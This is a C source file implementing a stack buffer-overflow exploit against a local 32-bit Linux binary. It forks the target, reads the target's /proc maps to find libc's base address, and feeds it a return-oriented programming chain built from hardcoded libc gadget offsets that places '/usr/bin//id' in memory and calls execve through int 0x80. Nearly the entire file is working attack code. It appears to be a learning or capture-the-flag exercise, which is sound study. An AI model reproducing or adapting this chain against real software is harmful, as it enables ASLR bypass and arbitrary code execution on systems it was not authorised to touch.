#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<string.h>
#include<sys/types.h>
#include<sys/stat.h>
#include<fcntl.h>
#include<stdint.h>
#include<signal.h>

    int pipe_in2out[2];
    int pipe_out2in[2];

#define EIP_OFFSET   24
#define PAYLOAD_SIZE 1024
/**
 * Gadgets available from libc: we try to build up code using %eax as a stack
 * pointer and %ecx as a temporary register.
 */
#define DUMMY           0x90909090
#define STACK           0x001a7040 // libc's .data segment
#define INC_ESP         0x000eae0c // inc %esp ; ret
#define ECXTOSTACK      0x0002db5f // mov %ecx,(%eax) ; ret
#define INT80           0x0002e5b5 // int $0x80
#define POP_EDCAX       0x000ed7ef // pop %edx ; pop %ecx ; pop %eax ; ret
#define POP_EBX         0x000198ae // pop %ebx ; ret
#define RESET_EAX       0x0002ef4c // xor eax,eax ; ret
#define INC_EAX         0x00006e2c // inc %eax ; ret
#define PUSH_EAX        0x000facb2 // push %eax ; ret
#define INC_ECX         0x0016fe09 // inc %ecx ; ret
#define USR             0x7273752f // "/usr"
#define BIN             0x6e69622f // "/bin"
#define ID              0x64692f2f // "//id "

#define CHECK(msg, rc) ;
void check_return_code(char* message, int rc) {
    if (rc < 0) {
        perror(message);
        exit(1);
    }
}

#define SIZE 4096
#define FMT_STRING "cat /proc/%d/maps | grep '%s' | grep r-xp | cut --field=1 --delimiter='-'"

uint32_t get_libc_code_base_address(int pid, const char* cmdname) {
    char libc_address_string[9];
    char cmd[1024];
    sprintf(cmd, FMT_STRING, pid, cmdname);

    fprintf(stderr, "cmd: %s\n", cmd);

    FILE* proc_file = popen(cmd, "r");
    int proc_fd = fileno(proc_file);

    int count = read(proc_fd, libc_address_string, 8);
    if (count < 8) {
        fprintf(stderr, " [!] impossible to read memory mapping\n");
        exit(1);
    }

    pclose(proc_file);


    uint32_t libc_address;

    sscanf(libc_address_string, "%x", &libc_address);

    return libc_address;
}

void write_to_process(char* buffer, size_t size) {
    int result;
    result = write(pipe_out2in[1], buffer, size);
    if (result <= 0) {
        perror(" [E]");
    }

    printf(" [>] ");
    write(STDOUT_FILENO, buffer, size);
    printf("\n");
}

/**
 * Build up the payload for the process in 
 */
char* prepare_paylod(int pid) {
    uint32_t libc_base_address = get_libc_code_base_address(
        pid,
        "/lib/i386-linux-gnu/i686/cmov/libc-2.19.so");// FIXME: libc is hardcoded
    fprintf(stderr, " [+] libc base address: 0x%x\n", libc_base_address);
    fprintf(stderr, " [+] libc .data address: 0x%x\n", libc_base_address + STACK);

    char* input = malloc(EIP_OFFSET + PAYLOAD_SIZE);
    memset(input, 'A', EIP_OFFSET);

    uint32_t payload[] = {
        0x41424344, // this seems unnecessary but we don't understand yet

        libc_base_address + POP_EDCAX,
        DUMMY,
        USR,
        libc_base_address + STACK, // now %eax contains the .data address
        libc_base_address + ECXTOSTACK,

        libc_base_address + POP_EDCAX,
        DUMMY,
        BIN,
        libc_base_address + STACK + 4,
        libc_base_address + ECXTOSTACK,

        libc_base_address + POP_EDCAX,
        DUMMY,
        ID,
        libc_base_address + STACK + 8,
        libc_base_address + ECXTOSTACK, // now .data contains "/usr/bin//id"

        libc_base_address + POP_EDCAX,
        DUMMY,
        0xffffffff, // we want to overflow to zero
        libc_base_address + STACK + 12,

        // now %ecx = 0xffffffff
        libc_base_address + INC_ECX, // now is zero!!!
        libc_base_address + ECXTOSTACK,

        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + ECXTOSTACK, // place a NULL in STACK + 20

        // here we create the char**
        libc_base_address + POP_EDCAX,
        DUMMY,
        libc_base_address + STACK,
        libc_base_address + STACK + 16,
        libc_base_address + ECXTOSTACK,

        // here we set the %edx and %ecx
        libc_base_address + POP_EDCAX,
        libc_base_address + STACK + 20,
        libc_base_address + STACK + 16,
        DUMMY,

        // final part
        libc_base_address + RESET_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + INC_EAX,
        libc_base_address + POP_EBX,
        libc_base_address + STACK,
        // %eax = 11, %ebx = "/usr/bin/id" %ecx = { "/usr/bin/id ", NULL }
        libc_base_address + INT80,
    };
    //memset(input + EIP_OFFSET, 'B', 4);
    memcpy(input + EIP_OFFSET, payload, sizeof(payload));

    return input;
}

void handler(int s) {
    printf("Caught SIGPIPE\n");
}
/**
 * Wrap the execution of the binary passed as argument
 * and inject it by its stdin.
 */
int main(int argc, char* argv[]) {
    int pid;

    pipe(pipe_in2out);
    pipe(pipe_out2in);

    pid = fork();

    char* cmd = argv[1];

    signal(SIGPIPE, handler);
    signal(SIGCHLD, handler);

    if(pid == 0) {// child
        fprintf(stderr, " [+] forked '%s'\n", cmd);
        close(pipe_in2out[0]);
        close(pipe_out2in[1]);
        // connect the stdout
        check_return_code("dup2", dup2(pipe_in2out[1], STDOUT_FILENO));
        check_return_code("dup2", dup2(pipe_out2in[0], STDIN_FILENO));
        if(execv(cmd, argv + 1) < 0)
            perror("execv");
    } else if (pid == -1) {
        perror("fork()");
        exit(1);
    }

    fprintf(stderr, " [+] just forked pid %d\n", pid);

    close(pipe_in2out[1]);
    close(pipe_out2in[0]);

    // first of all, read the banner from the vulnerable application
    char buffer[256];
    int count = read(pipe_in2out[0], buffer, 24);
    buffer[count] = '\0';
    fprintf(stderr, "[->] %s\n", buffer);

    getchar();

    char* input = prepare_paylod(pid);

    write_to_process(input, strlen(input));

    free(input);

    count = read(pipe_in2out[0], buffer, 256);
    if (count <= 0) {
        perror("wriote()");
    }
    buffer[count] = '\0';
    fprintf(stderr, "[->] %s\n", buffer);


    return 0;
}
